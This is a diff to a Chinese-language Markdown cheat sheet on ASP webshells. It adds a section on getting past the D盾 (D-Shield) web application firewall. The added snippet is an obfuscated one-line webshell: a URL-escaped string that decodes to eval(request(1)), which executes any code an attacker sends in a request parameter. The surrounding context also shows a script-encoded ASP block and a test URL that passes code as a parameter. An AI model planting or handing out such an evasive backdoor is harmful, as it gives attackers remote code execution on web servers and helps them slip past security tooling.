@@ -113,5 +113,17 @@ http://127.0.0.1/1.asp?1=response.write(1)
 <%#@~^EAAAAA==n7lsvD;E/DcF*#hAUAAA==^#~@%>
 ```
 
+# waf
+#### waf逻辑
+针对d盾，0级
+```
+<%
+Function bypass():
+    dim bypass
+End Function
+eval(unescape("%65%76%61%6c%28%72%65%71%75%65%73%74%28%31%29%29"))
+%>
+```
+
 # 参考
 新仙剑之鸣、LandGrey
